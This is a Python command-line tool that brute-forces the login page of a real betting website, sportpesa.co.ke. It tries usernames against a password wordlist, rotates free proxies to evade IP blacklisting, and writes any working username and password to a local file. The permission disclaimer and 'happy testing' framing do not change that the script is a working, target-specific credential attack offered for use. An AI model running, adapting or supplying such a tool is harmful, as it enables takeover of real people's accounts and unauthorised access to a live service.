#!/usr/bin/env python3
try:
	from requests import get as getSite
	from urllib.request import urlopen as openSite
	from itertools import cycle
	from colorama import Fore,init
	from progress.bar import IncrementalBar as Bar
	from crayons import red,yellow,green,cyan,magenta,blue
	from sys import exit as bye
	from sys import platform
	from subprocess import call as run
	from time import sleep as wait
	from random import choice
	from robobrowser import RoboBrowser as rbb
	from prettytable import PrettyTable as ptb
	import os.path
except:
	from sys import exit as bye
	bye("\n\033[91m"+"Run "+"\033[93m"+"python3 -m pip install -r requirements.txt"+"\033[91m"+" or "+"\033[93m"+"pip install -r requirements.txt"+"\033[91m"+" to install the needed dependencies as specified in the 'requirements.txt' file!\033[0m\n")

colors=(red,yellow,green,magenta,blue)
init(autoreset=True)

try:
	publicIP=openSite("http://ip.42.pl/raw").read()
	publicIP=publicIP.decode("utf-8")
except:
	publicIP=getSite("https://api.ipify.org").text

banner1=r"""
     ███████╗██████╗  ██████╗ ██████╗ ████████╗██████╗ ███████╗███████╗ █████╗
     ██╔════╝██╔══██╗██╔═══██╗██╔══██╗╚══██╔══╝██╔══██╗██╔════╝██╔════╝██╔══██╗
     ███████╗██████╔╝██║   ██║██████╔╝   ██║   ██████╔╝█████╗  ███████╗███████║
     ╚════██║██╔═══╝ ██║   ██║██╔══██╗   ██║   ██╔═══╝ ██╔══╝  ╚════██║██╔══██║
     ███████║██║     ╚██████╔╝██║  ██║   ██║   ██║     ███████╗███████║██║  ██║
     ╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝   ╚═╝   ╚═╝     ╚══════╝╚══════╝╚═╝  ╚═╝

██████╗ ██████╗ ██╗   ██╗████████╗███████╗███████╗ ██████╗ ██████╗  ██████╗███████╗██████╗
██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝██╔══██╗
██████╔╝██████╔╝██║   ██║   ██║   █████╗  █████╗  ██║   ██║██████╔╝██║     █████╗  ██████╔╝
██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  ██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝  ██╔══██╗
██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗██║     ╚██████╔╝██║  ██║╚██████╗███████╗██║  ██║
╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝╚═╝  ╚═╝

                             Made by Brian Njogu
"""

banner2=r"""
    _____             _   _____
   |   __|___ ___ ___| |_|  _  |___ ___ ___
   |__   | . | . |  _|  _|   __| -_|_ -| .'|
   |_____|  _|___|_| |_| |__|  |___|___|__,|
   	 |_|
 _____         _       ___
| __  |___ _ _| |_ ___|  _|___ ___ ___ ___ ___
| __ -|  _| | |  _| -_|  _| . |  _|  _| -_|  _|
|_____|_| |___|_| |___|_| |___|_| |___|___|_|

              Made by Brian Njogu
"""

banner3=r"""
      ____  ____   __  ____  ____  ____  ____  ____   __
     / ___)(  _ \ /  \(  _ \(_  _)(  _ \(  __)/ ___) / _\
     \___ \ ) __/(  O ))   /  )(   ) __/ ) _) \___ \/    \
     (____/(__)   \__/(__\_) (__) (__)  (____)(____/\_/\_/
 ____  ____  _  _  ____  ____  ____  __  ____   ___  ____  ____
(  _ \(  _ \/ )( \(_  _)(  __)(  __)/  \(  _ \ / __)(  __)(  _ \
 ) _ ( )   /) \/ (  )(   ) _)  ) _)(  O ))   /( (__  ) _)  )   /
(____/(__\_)\____/ (__) (____)(__)  \__/(__\_) \___)(____)(__\_)

                     Made by Brian Njogu
"""

banner4=r"""
  _____                  _  ______
 /  ___|                | | | ___ \
 \ `--. _ __   ___  _ __| |_| |_/ /__  ___  __ _
  `--. \ '_ \ / _ \| '__| __|  __/ _ \/ __|/ _` |
 /\__/ / |_) | (_) | |  | |_| | |  __/\__ \ (_| |
 \____/| .__/ \___/|_|   \__\_|  \___||___/\__,_|
       | |
       |_|
______            _        __
| ___ \          | |      / _|
| |_/ /_ __ _   _| |_ ___| |_ ___  _ __ ___ ___ _ __
| ___ \ '__| | | | __/ _ \  _/ _ \| '__/ __/ _ \ '__|
| |_/ / |  | |_| | ||  __/ || (_) | | | (_|  __/ |
\____/|_|   \__,_|\__\___|_| \___/|_|  \___\___|_|

               Made by Brian Njogu
"""

banner5=r"""
    _________                     __ __________
   /   _____/_____   ____________/  |\______   \ ____   ___________
   \_____  \\____ \ /  _ \_  __ \   __\     ___// __ \ /  ___/\__  \
   /        \  |_> >  <_> )  | \/|  | |    |   \  ___/ \___ \  / __ \_
  /_______  /   __/ \____/|__|   |__| |____|    \___  >____  >(____  /
          \/|__|                                    \/     \/      \/
__________                __          _____
\______   \_______ __ ___/  |_  _____/ ____\___________   ____  ___________
 |    |  _/\_  __ \  |  \   __\/ __ \   __\/  _ \_  __ \_/ ___\/ __ \_  __ \
 |    |   \ |  | \/  |  /|  | \  ___/|  | (  <_> )  | \/\  \__\  ___/|  | \/
 |______  / |__|  |____/ |__|  \___  >__|  \____/|__|    \___  >___  >__|
        \/                         \/                        \/    \/

                         Made by Brian Njogu
"""
banner6=r"""
    _________                     __ __________
   /   _____/_____   ____________/  |\______   \ ____   ___________
   \_____  \\____ \ /  _ \_  __ \   __\     ___// __ \ /  ___/\__  \
   /        \  |_> >  <_> )  | \/|  | |    |   \  ___/ \___ \  / __ \_
  /_______  /   __/ \____/|__|   |__| |____|    \___  >____  >(____  /
          \/|__|                                    \/     \/      \/
__________                __          _____
\______   \_______ __ ___/  |_  _____/ ____\___________   ____  ___________
 |    |  _/\_  __ \  |  \   __\/ __ \   __\/  _ \_  __ \_/ ___\/ __ \_  __ \
 |    |   \ |  | \/  |  /|  | \  ___/|  | (  <_> )  | \/\  \__\  ___/|  | \/
 |______  / |__|  |____/ |__|  \___  >__|  \____/|__|    \___  >___  >__|
        \/                         \/                        \/    \/

                Thanks for using this tool. Come back soon.
"""
banner7=r"""
    _________                     __ __________
   /   _____/_____   ____________/  |\______   \ ____   ___________
   \_____  \\____ \ /  _ \_  __ \   __\     ___// __ \ /  ___/\__  \
   /        \  |_> >  <_> )  | \/|  | |    |   \  ___/ \___ \  / __ \_
  /_______  /   __/ \____/|__|   |__| |____|    \___  >____  >(____  /
          \/|__|                                    \/     \/      \/
__________                __          _____
\______   \_______ __ ___/  |_  _____/ ____\___________   ____  ___________
 |    |  _/\_  __ \  |  \   __\/ __ \   __\/  _ \_  __ \_/ ___\/ __ \_  __ \
 |    |   \ |  | \/  |  /|  | \  ___/|  | (  <_> )  | \/\  \__\  ___/|  | \/
 |______  / |__|  |____/ |__|  \___  >__|  \____/|__|    \___  >___  >__|
        \/                         \/                        \/    \/

                Thanks for using this tool. Come back soon.
"""


banners=(banner1,banner2,banner3,banner4,banner5)
table=ptb()

def browserProxy(usr,pwd,proxy):
	YE=Fore.YELLOW
	GR=Fore.GREEN
	PU=Fore.MAGENTA
	BL=Fore.BLUE
	trial=PU+"[*] Trying username "+YE+"{}"+PU+" against password "+YE+"{}"+PU+" (Proxy IP=>"+BL+"{}"+PU+")"
	print(trial.format(usr,pwd,proxy))
	session.proxies={"http":proxy,"https":proxy}
	bot=rbb(session=session,parser="html.parser")
	url="https://sportpesa.co.ke/login"
	try:
		bot.open(url)
	except:
		print(red("[!] Unable to open '{}'. Most likely a proxy connection timeout.".format(url)))
		return False
	else:
		forms=bot.get_forms()
		if len(forms) >= 1:
			form=forms[1]
			form["username"]=str(usr)
			form["password"]=str(pwd)
			bot.submit_form(form)
			data=str(bot.parsed)
			if "user does not exist" in data or "Incorrect password" in data:
				print(red("[-] The login above failed due to incorrect credentials!"))
				return False
			else:
				GR=Fore.GREEN
				YE=Fore.YELLOW
				BL=Fore.CYAN
				success=GR+"\n[+] Authentication succeeded! Username: "+YE+"{}"+GR+" Password: "+YE+"{}"
				print(success.format(usr,pwd))
				wait(1.5)
				try:
					with open('creds.txt','a') as w:
						w.write("Username: {}\n".format(usr))
						w.write("Password: {}\n".format(pwd))
				except:
					pass
				else:
					print(yellow("[+] The credentials have been saved to 'creds.txt', to your current working directory."))
				return True
		else:
			bye(red("[-] No login forms were discovered on the site. Please change the url."))

def browserNoProxy(usr,pwd,myIP):
	YE=Fore.YELLOW
	GR=Fore.GREEN
	PU=Fore.MAGENTA
	BL=Fore.BLUE
	trial=PU+"[*] Trying username "+YE+"{}"+PU+" against password "+YE+"{}"+PU+" (Public IP=>"+BL+"{}"+PU+")"
	print(trial.format(usr,pwd,myIP))
	bot=rbb(history=True,parser="html.parser")
	url="https://sportpesa.co.ke/login"
	try:
		bot.open(url)
	except:
		bye(red("\n[!] Unable to open '{}'. Execution stopped.".format(url)))
	else:
		forms=bot.get_forms()
		if len(forms) >= 1:
			form=forms[1]
			form["username"]=str(usr)
			form["password"]=str(pwd)
			bot.submit_form(form)
			data=str(bot.parsed)
			if "user does not exist" in data or "Incorrect password" in data:
				print(red("[-] The login above failed due to incorrect credentials!"))
				return False
			else:
				GR=Fore.GREEN
				YE=Fore.YELLOW
				BL=Fore.CYAN
				success=GR+"\n[+] Authentication succeeded! Username: "+YE+"{}"+GR+" Password: "+YE+"{}"
				print(success.format(usr,pwd))
				wait(1.5)
				try:
					with open('creds.txt','a') as w:
						w.write("Username: {}\n".format(usr))
						w.write("Password: {}\n".format(pwd))
				except:
					pass
				else:
					print(yellow("[+] The credentials have been saved to 'creds.txt', to your current working directory."))
				return True
		else:
			bye(red("[-] No login forms were discovered on the site. Please change the url."))


def attack(usernames,wordlist):
	global authenticated
	authenticated=False
	proxyList=[]
	try:
		for newprox in proxies.workingProxies:
			proxyList.append(newprox)
	except:
		pass
	while not authenticated:
		if "list" in str(type(usernames)):
			usr=usernames[:]
			words=len(wordlist)
			count=0
			if len(usr) > 1:
				for person in usr:
					for passw in wordlist:
						try:
							if proxies.issetProxy:
								currentProxy=choice(proxyList)
								authenticated=browserProxy(person,passw,currentProxy)
							else:
								authenticated=browserNoProxy(person,passw,publicIP)
						except:
							authenticated=browserNoProxy(person,passw,publicIP)
						if authenticated:
							return True
						else:
							pass
			else:
				for passw in wordlist:
					if proxies.issetProxy:
						currentProxy=choice(proxyList)
						authenticated=browserProxy(usr[0],passw,currentProxy)
					else:
						authenticated=browserNoProxy(usr[0],passw,publicIP)
					if authenticated:
						return True
					else:
						return False
		elif "str" in str(type(usernames)):
			usr=usernames
			for pwd in wordlist:
				try:
					if proxies.issetProxy:
						currentProxy=choice(proxyList)
						authenticated=browserProxy(usr,pwd,currentProxy)
					else:
						authenticated=browserNoProxy(usr,pwd,publicIP)
				except:
					authenticated=browserNoProxy(usr,pwd,publicIP)
				if authenticated:
					return True
				else:
					pass
	if authenticated:
		return True
	else:
		return False

def userlist():
	global usr
	try:
		usr=str(input(yellow("\nEnter username to authenticate with, or a file with usernames: ")))
		while len(usr) < 1:
			usr=str(input(red("\nEnter a username, or a file with usernames to authenticate with: ")))
	except:
		pass
	else:
		if os.path.isfile(usr):
			try:
				with open(usr) as u:
					users=u.read().splitlines()
			except:
				bye(red("[-] Unable to open '{}'. Is this a valid file?"))
			else:
				print("\n")
				userBar=Bar("[+] Loading Usernames",max=100,suffix="%(percent)d%%")
				for user in range(101):
					wait(0.007)
					userBar.next()
				userBar.finish()
				print(green("\n[+] Username file loaded successfully! ({} usernames)".format(len(users))))
				return users
		else:
			try:
				agree=str(input(red("\n[-] '{}' is not a file. Use it as a username? (Y/N): ".format(usr))))
				while len(agree) < 1:
					agree=str(input(red("\n[-] '{}' is not a file. Use it as a username? (Y/N): ".format(usr))))
			except:
				bye(red("[-] Something is wrong with the username/list you provided\n"))
			else:
				if agree.upper() == "Y":
					print(green("\n[+] Selected username is '{}'".format(usr)))
					return usr
				elif agree.upper() == "N":
					userlist()
				else:
					bye(red("[-] Please try again, this time choosing Y or N when prompted"))


def loginFailed():
	color=red
	banner=banner7
	print(red("\n[-] Seems like you need to change the wordlists you're using."))
	print(color(banner7))
	bye()

def loginSuccessful():
	color=yellow
	banner=banner6
	print(color(banner6))
	bye()

def loadModules():
	global wrd
	global defaultWordlist
	try:
		if defaults:
			print(yellow("\nDefault password list found, Initialising..."))
			wait(1.5)
			defaultWordlist="wordlist.txt"
			with open(defaultWordlist) as f:
				wordlist=f.read().splitlines()
		elif not defaults:
			if not defaults:
				inp=str(input(red("\n[-] Can't seem to find the default password wordlist. Load your own? (Y/N): ")))
				while True:
					if len(inp) < 1:
						inp=str(input(red("\nEnter Y or N")))
					else:
						if inp.upper() == "Y":
							try:
								print("\n")
								wrd=str(input(yellow(r"Enter path to password wordlist: ")))
								while len(wrd) < 1:
									wrd=str(input(red(r"[-] Path cannot be empty: ")))
							except:
								pass
							else:
								if os.path.isfile(wrd):
									try:
										with open(wrd) as f:
											wordlist=f.read().splitlines()
									except:
										bye(red("\n[-] Unable to open and read the file '{}'. Does it exist?".format(wrd)))
									else:
										break
								else:
									bye(red("\n[-] Seems like the path you wrote doesn't point to a valid file!"))
						elif inp.upper() == "N":
							bye(red("\n[-] Download our default password wordlist to use this tool, or load your own."))
						else:
							bye(red("\n[-] Input not understood. Retry later."))
	except:
		if not defaults:
			inp=str(input(red("\n[-] Can't seem to find the default password wordlist. Load your own? (Y/N): ")))
			while True:
				if len(inp) < 1:
					inp=str(input(red("\nEnter Y or N")))
				else:
					if inp.upper() == "Y":
						try:
							print("\n")
							wrd=str(input(green(r"Enter path to password wordlist: ")))
							while len(wrd) < 1:
								wrd=str(input(red(r"[-] Path cannot be empty: ")))
						except:
							pass
						else:
							if os.path.isfile(wrd):
								try:
									with open(wrd) as f:
										wordlist=f.read().splitlines()
								except:
									bye(red("\n[-] Unable to open and read the file '{}'. Does it exist?".format(wrd)))
								else:
									break
							else:
								bye(red("\n[-] Seems like the path you wrote doesn't point to a valid file!"))
					elif inp.upper() == "N":
						bye(red("\n[-] Download our default password wordlist to use this tool, or load your own."))
					else:
						bye(red("\n[-] Input not understood. Retry later."))
	try:
		print("\n")
		bar=Bar("[+] Loading Passwords",max=100,suffix="%(percent)d%%")
		for chunk in range(101):
			wait(0.009)
			bar.next()
		bar.finish()
	except:
		print(red("[-] Looks like the module 'progress' isn't installed!"))
		bye()
	else:
		print(green("\n[+] Password wordlist loaded successfully! ({} passwords)\n".format(len(wordlist))))
		return wordlist

def showBanner():
	global defaults
	color=choice(colors)
	banner=choice(banners)
	print(color(banner))
	disclaimer=r"""
     This script attempts to bruteforce the login page of the
     official SportPesa website. Only perform this operation
     after being granted explicit permission to do so by them.
          I will not be held liable for any misconduct!
	"""
	print(red(disclaimer))
	try:
		answers=["Y","N"]
		confirm=str(input(green("Confirm that you have permission to bruteforce SportPesa (Y/N): ")))
		print("\n")
		while True:
			if len(confirm) < 1 or confirm.upper() not in answers:
				confirm=str(input(red("Enter Y or N: ")))
			else:
				break
	except:
		bye(red("[-] Something is wrong with your input. Please try again.\n"))
	else:
		if confirm.upper() == "Y":
			try:
				ask=str(input(yellow("Use default password wordlist? (Y/N): ")))
				while len(ask) < 1:
					ask=str(input(red("Use default password wordlist? (Y/N): ")))
			except:
				bye(red("[-] Unexpected input! Please retry."))
			else:
				if ask.upper() == "Y":
					defaults=True
					print(green("\n[+] Happy testing. We do not take any responsibility in the event of unlawful actions."))
					wordlist=loadModules()
				elif ask.upper() == "N":
					defaults=False
					print(green("\n[+] Happy testing. We do not take any responsibility in the event of unlawful actions."))
					wordlist=loadModules()
				else:
					bye(red("[-] Please retry. Enter Y or N when prompted."))

			if wordlist:
				return wordlist
		elif confirm.upper() == "N":
			bye(red("[-] Please seek their permission before you test their website using this tool.\n"))

def chooseAttackType():
	selection=str(input(yellow("\nAutomate attack with proxies? Circumvents blacklisting, but slower (Y/N): ")))
	incorrect=True
	while incorrect:
		if selection.upper() == "Y":
			wait(0.7)
			print(cyan("\n[*] Attempting to fetch free proxies from free-proxy-list.net\n"))
			incorrect=False
		elif selection.upper() == "N":
			wait(1)
			print(red("\n[*] Your bruteforce requests will not be tunnelled through proxy servers\n[*]	  This means that your real IP address might be logged!"))
			wait(2)
			incorrect=False
		else:
			selection=str(input(red("Automate attack with proxies? Circumvents blacklisting, but slower (Y/N): ")))

	return selection

if __name__ == "__main__":
	from platform import python_version as version
	if int(version()[0]) < 3:
		import sys
		sys.exit("You need to use Python 3 to run this!")
	try:
		if platform.startswith("lin"):
			run("clear",shell=True)
		elif platform.startswith("win"):
			run("cls",shell=True)
		else:
			color=choice(colors)
			print(color(banner1))
			bye(red("[-] You need to run this on a Windows PC or a Linux PC\n"))
	except:
		bye(red("[-] You need to run this on a Windows PC or a Linux PC\n"))
	else:
		wordlist=showBanner()
		if wordlist:
			usernames=userlist()
		if usernames:
			fieldOne="Username(s) To Use"
			fieldTwo="Password(s) To Use"
			fieldThree="Login Page URL"
			fieldFour="Using Proxies"
			columns=[fieldOne,fieldTwo,fieldThree,fieldFour]
			userpath=usr
			try:
				passpath=wrd
			except:
				passpath=defaultWordlist
			table.add_column(columns[0],[userpath])
			table.add_column(columns[1],[passpath])
			table.add_column(columns[2],["https://sportpesa.co.ke/login"])

			proxyChoice=chooseAttackType()

			if proxyChoice.upper() == "Y":
				import proxies
				from requests import Session
				session=Session()
				tableProxy=True
			elif proxyChoice.upper() == "N":
				tableProxy=False

			if tableProxy and proxies.issetProxy == True:
				table.add_column(columns[3],["True"])
			elif tableProxy and proxies.issetProxy == False:
				table.add_column(columns[3],["False"])
			else:
				table.add_column(columns[3],["False"])

			print(yellow("\nThe following credentials will be used to bruteforce the site:"))
			print(magenta(table))
			exit=red("exit")
			print(yellow("To begin the bruteforce attack, enter {}.".format(green("attack"),exit)))
			print(yellow("Have fun while hacking. To exit, enter {}.".format(red("exit"))))
			wait(2)
			try:
				decision=str(input(cyan("\n[root@execute:~#] ")))
				while len(decision) < 1:
					decision=str(input(cyan("[root@execute:~#] ")))
			except:
				bye(red("\n[-] Unexpected input. Retry later."))
			else:
				if decision.lower() == "attack":
					print("\n")
					mainCheck=attack(usernames,wordlist)
				elif decision.lower() == "exit" or decision.lower() == "quit":
					print(red(banner7))
					bye()
				else:
					while True:
						decision=str(input(cyan("[root@execute:~#] ")))
						if decision.lower() == "attack" and len(decision) > 1:
							print("\n")
							mainCheck=attack(usernames,wordlist)
							break
						elif decision.lower() == "exit" and len(decision) > 1:
							print(red(banner7))
							bye()
						else:
							pass
					if mainCheck:
						loginSuccessful()
					else:
						loginFailed()
				if mainCheck:
					loginSuccessful()
				else:
					loginFailed()
